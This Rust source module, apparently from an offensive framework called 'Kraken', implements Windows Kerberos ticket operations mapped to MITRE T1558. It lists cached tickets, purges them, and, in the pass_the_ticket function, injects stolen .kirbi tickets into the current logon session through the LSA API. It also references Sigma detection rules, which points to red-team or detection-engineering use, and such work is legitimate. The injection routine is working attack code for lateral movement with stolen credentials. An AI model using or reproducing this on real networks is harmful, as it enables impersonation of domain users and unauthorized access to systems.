//! Kerberos Ticket Operations — T1558
//!
//! Provides:
//! - list_tickets: Enumerate cached Kerberos tickets (klist equivalent)
//! - pass_the_ticket: Inject a .kirbi ticket into the current logon session
//! - purge_tickets: Purge all cached Kerberos tickets
//!
//! ## Detection rules
//! wiki/detection/sigma/kraken_ad_ops.yml

use common::KrakenError;

/// Cached Kerberos ticket info
#[derive(Debug, Clone)]
pub struct TicketInfo {
    pub client_name: String,
    pub server_name: String,
    pub realm: String,
    pub start_time: String,
    pub end_time: String,
    pub renew_time: String,
    pub encryption_type: String,
    pub flags: u32,
}

// ---------------------------------------------------------------------------
// Windows implementation
// ---------------------------------------------------------------------------

#[cfg(windows)]
pub fn list_tickets() -> Result<Vec<TicketInfo>, KrakenError> {
    use std::ffi::CStr;
    use windows_sys::Win32::Security::Authentication::Identity::{
        LsaCallAuthenticationPackage, LsaConnectUntrusted, LsaFreeReturnBuffer,
        LsaLookupAuthenticationPackage, KerbQueryTicketCacheMessage,
        KERB_QUERY_TKT_CACHE_REQUEST, KERB_QUERY_TKT_CACHE_RESPONSE,
        KERB_TICKET_CACHE_INFO,
    };
    use windows_sys::Win32::Foundation::{NTSTATUS, STATUS_SUCCESS};

    let mut tickets = Vec::new();

    unsafe {
        // 1. Connect to LSA
        let mut lsa_handle: usize = 0;
        let status = LsaConnectUntrusted(&mut lsa_handle);
        if status != STATUS_SUCCESS {
            return Err(KrakenError::Module(format!(
                "LsaConnectUntrusted failed: 0x{:08X}",
                status as u32
            )));
        }

        // 2. Lookup Kerberos authentication package
        let pkg_name_bytes = b"Kerberos\0";
        let mut lsa_str = windows_sys::Win32::Security::Authentication::Identity::LSA_STRING {
            Length: (pkg_name_bytes.len() - 1) as u16,
            MaximumLength: pkg_name_bytes.len() as u16,
            Buffer: pkg_name_bytes.as_ptr() as *mut i8,
        };
        let mut auth_pkg: u32 = 0;
        let status = LsaLookupAuthenticationPackage(lsa_handle, &mut lsa_str, &mut auth_pkg);
        if status != STATUS_SUCCESS {
            return Err(KrakenError::Module(format!(
                "LsaLookupAuthenticationPackage failed: 0x{:08X}",
                status as u32
            )));
        }

        // 3. Build KERB_QUERY_TKT_CACHE_REQUEST
        //    MessageType = KerbQueryTicketCacheMessage (14)
        //    LogonId     = LUID{0, 0}  (current logon session)
        let request = KERB_QUERY_TKT_CACHE_REQUEST {
            MessageType: KerbQueryTicketCacheMessage,
            LogonId: windows_sys::Win32::Foundation::LUID {
                LowPart: 0,
                HighPart: 0,
            },
        };

        // 4. Call LsaCallAuthenticationPackage
        let mut response_ptr: *mut KERB_QUERY_TKT_CACHE_RESPONSE = std::ptr::null_mut();
        let mut response_len: u32 = 0;
        let mut proto_status: NTSTATUS = 0;

        let status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_pkg,
            &request as *const _ as *const std::ffi::c_void,
            std::mem::size_of::<KERB_QUERY_TKT_CACHE_REQUEST>() as u32,
            &mut response_ptr as *mut _ as *mut *mut std::ffi::c_void,
            &mut response_len,
            &mut proto_status,
        );

        if status != STATUS_SUCCESS || proto_status != STATUS_SUCCESS {
            return Err(KrakenError::Module(format!(
                "LsaCallAuthenticationPackage failed: status=0x{:08X} proto=0x{:08X}",
                status as u32, proto_status as u32
            )));
        }

        // 5. Parse KERB_QUERY_TKT_CACHE_RESPONSE
        if !response_ptr.is_null() {
            let response = &*response_ptr;
            let count = response.CountOfTickets as usize;

            // The ticket array follows immediately after the response header
            let ticket_array = &response.Tickets as *const KERB_TICKET_CACHE_INFO;

            for i in 0..count {
                let ti = &*ticket_array.add(i);

                let server_name = wide_string_from_unicode(&ti.ServerName);
                let realm = wide_string_from_unicode(&ti.RealmName);

                let enc_type = match ti.EncryptionType {
                    17 => "AES128-CTS-HMAC-SHA1",
                    18 => "AES256-CTS-HMAC-SHA1",
                    23 => "RC4-HMAC",
                    3  => "DES-CBC-MD5",
                    _  => "Unknown",
                };

                tickets.push(TicketInfo {
                    client_name: String::new(), // not in KERB_TICKET_CACHE_INFO
                    server_name,
                    realm,
                    start_time: filetime_to_string(ti.StartTime),
                    end_time: filetime_to_string(ti.EndTime),
                    renew_time: filetime_to_string(ti.RenewTime),
                    encryption_type: enc_type.to_string(),
                    flags: ti.TicketFlags,
                });
            }

            LsaFreeReturnBuffer(response_ptr as *mut std::ffi::c_void);
        }
    }

    Ok(tickets)
}

#[cfg(windows)]
pub fn pass_the_ticket(kirbi_bytes: &[u8]) -> Result<String, KrakenError> {
    use windows_sys::Win32::Security::Authentication::Identity::{
        LsaCallAuthenticationPackage, LsaConnectUntrusted, LsaFreeReturnBuffer,
        LsaLookupAuthenticationPackage, KerbSubmitTicketMessage,
        KERB_SUBMIT_TKT_REQUEST,
    };
    use windows_sys::Win32::Foundation::{NTSTATUS, STATUS_SUCCESS};

    if kirbi_bytes.is_empty() {
        return Err(KrakenError::Module("kirbi_bytes is empty".into()));
    }

    unsafe {
        // 1. Connect to LSA
        let mut lsa_handle: usize = 0;
        let status = LsaConnectUntrusted(&mut lsa_handle);
        if status != STATUS_SUCCESS {
            return Err(KrakenError::Module(format!(
                "LsaConnectUntrusted failed: 0x{:08X}",
                status as u32
            )));
        }

        // 2. Lookup Kerberos authentication package
        let pkg_name_bytes = b"Kerberos\0";
        let mut lsa_str = windows_sys::Win32::Security::Authentication::Identity::LSA_STRING {
            Length: (pkg_name_bytes.len() - 1) as u16,
            MaximumLength: pkg_name_bytes.len() as u16,
            Buffer: pkg_name_bytes.as_ptr() as *mut i8,
        };
        let mut auth_pkg: u32 = 0;
        let status = LsaLookupAuthenticationPackage(lsa_handle, &mut lsa_str, &mut auth_pkg);
        if status != STATUS_SUCCESS {
            return Err(KrakenError::Module(format!(
                "LsaLookupAuthenticationPackage failed: 0x{:08X}",
                status as u32
            )));
        }

        // 3. Build KERB_SUBMIT_TKT_REQUEST + appended kirbi bytes
        //    Layout: [KERB_SUBMIT_TKT_REQUEST header][kirbi_bytes...]
        let header_size = std::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>();
        let total_size = header_size + kirbi_bytes.len();
        let mut buf: Vec<u8> = vec![0u8; total_size];

        let req = buf.as_mut_ptr() as *mut KERB_SUBMIT_TKT_REQUEST;
        (*req).MessageType = KerbSubmitTicketMessage;
        (*req).LogonId = windows_sys::Win32::Foundation::LUID {
            LowPart: 0,
            HighPart: 0,
        };
        (*req).Flags = 0;
        (*req).KerbCredSize = kirbi_bytes.len() as u32;
        (*req).KerbCredOffset = header_size as u32;

        // Append kirbi bytes after the struct
        std::ptr::copy_nonoverlapping(
            kirbi_bytes.as_ptr(),
            buf.as_mut_ptr().add(header_size),
            kirbi_bytes.len(),
        );

        // 4. Submit
        let mut response_ptr: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut response_len: u32 = 0;
        let mut proto_status: NTSTATUS = 0;

        let status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_pkg,
            buf.as_ptr() as *const std::ffi::c_void,
            total_size as u32,
            &mut response_ptr,
            &mut response_len,
            &mut proto_status,
        );

        if !response_ptr.is_null() {
            LsaFreeReturnBuffer(response_ptr);
        }

        if status != STATUS_SUCCESS {
            return Err(KrakenError::Module(format!(
                "LsaCallAuthenticationPackage (submit) failed: 0x{:08X}",
                status as u32
            )));
        }
        if proto_status != STATUS_SUCCESS {
            return Err(KrakenError::Module(format!(
                "Ticket submission rejected by LSA: 0x{:08X}",
                proto_status as u32
            )));
        }
    }

    Ok("Ticket injected successfully".to_string())
}

#[cfg(windows)]
pub fn purge_tickets() -> Result<String, KrakenError> {
    use windows_sys::Win32::Security::Authentication::Identity::{
        LsaCallAuthenticationPackage, LsaConnectUntrusted, LsaFreeReturnBuffer,
        LsaLookupAuthenticationPackage, KerbPurgeTicketCacheMessage,
        KERB_PURGE_TKT_CACHE_REQUEST,
    };
    use windows_sys::Win32::Foundation::{NTSTATUS, STATUS_SUCCESS};

    unsafe {
        // 1. Connect to LSA
        let mut lsa_handle: usize = 0;
        let status = LsaConnectUntrusted(&mut lsa_handle);
        if status != STATUS_SUCCESS {
            return Err(KrakenError::Module(format!(
                "LsaConnectUntrusted failed: 0x{:08X}",
                status as u32
            )));
        }

        // 2. Lookup Kerberos package
        let pkg_name_bytes = b"Kerberos\0";
        let mut lsa_str = windows_sys::Win32::Security::Authentication::Identity::LSA_STRING {
            Length: (pkg_name_bytes.len() - 1) as u16,
            MaximumLength: pkg_name_bytes.len() as u16,
            Buffer: pkg_name_bytes.as_ptr() as *mut i8,
        };
        let mut auth_pkg: u32 = 0;
        let status = LsaLookupAuthenticationPackage(lsa_handle, &mut lsa_str, &mut auth_pkg);
        if status != STATUS_SUCCESS {
            return Err(KrakenError::Module(format!(
                "LsaLookupAuthenticationPackage failed: 0x{:08X}",
                status as u32
            )));
        }

        // 3. Build KERB_PURGE_TKT_CACHE_REQUEST
        //    MessageType = KerbPurgeTicketCacheMessage (7)
        //    LogonId     = {0, 0}  (current session)
        //    ServerName / RealmName left empty to purge all tickets
        let request = KERB_PURGE_TKT_CACHE_REQUEST {
            MessageType: KerbPurgeTicketCacheMessage,
            LogonId: windows_sys::Win32::Foundation::LUID {
                LowPart: 0,
                HighPart: 0,
            },
            ServerName: windows_sys::Win32::Foundation::UNICODE_STRING {
                Length: 0,
                MaximumLength: 0,
                Buffer: std::ptr::null_mut(),
            },
            RealmName: windows_sys::Win32::Foundation::UNICODE_STRING {
                Length: 0,
                MaximumLength: 0,
                Buffer: std::ptr::null_mut(),
            },
        };

        let mut response_ptr: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut response_len: u32 = 0;
        let mut proto_status: NTSTATUS = 0;

        let status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_pkg,
            &request as *const _ as *const std::ffi::c_void,
            std::mem::size_of::<KERB_PURGE_TKT_CACHE_REQUEST>() as u32,
            &mut response_ptr,
            &mut response_len,
            &mut proto_status,
        );

        if !response_ptr.is_null() {
            LsaFreeReturnBuffer(response_ptr);
        }

        if status != STATUS_SUCCESS || proto_status != STATUS_SUCCESS {
            return Err(KrakenError::Module(format!(
                "Purge failed: status=0x{:08X} proto=0x{:08X}",
                status as u32, proto_status as u32
            )));
        }
    }

    Ok("All cached Kerberos tickets purged".to_string())
}

// ---------------------------------------------------------------------------
// Windows helper functions
// ---------------------------------------------------------------------------

#[cfg(windows)]
fn wide_string_from_unicode(
    us: &windows_sys::Win32::Foundation::UNICODE_STRING,
) -> String {
    if us.Buffer.is_null() || us.Length == 0 {
        return String::new();
    }
    let len = (us.Length / 2) as usize;
    let slice = unsafe { std::slice::from_raw_parts(us.Buffer, len) };
    String::from_utf16_lossy(slice)
}

#[cfg(windows)]
fn filetime_to_string(ft: i64) -> String {
    // FILETIME is 100-nanosecond intervals since 1601-01-01.
    // Convert to Unix timestamp for a simple representation.
    if ft == 0 || ft == i64::MAX {
        return "never".to_string();
    }
    // 11644473600 seconds between 1601-01-01 and 1970-01-01
    let unix_secs = (ft / 10_000_000) - 11_644_473_600i64;
    format!("unix:{}", unix_secs)
}

// ---------------------------------------------------------------------------
// Non-Windows stubs
// ---------------------------------------------------------------------------

#[cfg(not(windows))]
pub fn list_tickets() -> Result<Vec<TicketInfo>, KrakenError> {
    Err(KrakenError::Module(
        "Kerberos ticket operations are only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn pass_the_ticket(_kirbi: &[u8]) -> Result<String, KrakenError> {
    Err(KrakenError::Module(
        "Kerberos ticket operations are only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn purge_tickets() -> Result<String, KrakenError> {
    Err(KrakenError::Module(
        "Kerberos ticket operations are only supported on Windows".into(),
    ))
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ticket_info_struct() {
        let ticket = TicketInfo {
            client_name: "user@DOMAIN.COM".to_string(),
            server_name: "krbtgt/DOMAIN.COM".to_string(),
            realm: "DOMAIN.COM".to_string(),
            start_time: "2026-04-02 10:00".to_string(),
            end_time: "2026-04-02 20:00".to_string(),
            renew_time: "2026-04-09 10:00".to_string(),
            encryption_type: "AES256-CTS-HMAC-SHA1".to_string(),
            flags: 0x40e10000,
        };
        assert!(ticket.client_name.contains("DOMAIN"));
        assert_eq!(ticket.flags, 0x40e10000);
    }

    #[test]
    #[cfg(not(windows))]
    fn test_platform_guards() {
        let err = list_tickets().unwrap_err();
        assert!(err.to_string().contains("only supported on Windows"), "{err}");

        let err = pass_the_ticket(b"fake_kirbi").unwrap_err();
        assert!(err.to_string().contains("only supported on Windows"), "{err}");

        let err = purge_tickets().unwrap_err();
        assert!(err.to_string().contains("only supported on Windows"), "{err}");
    }
}
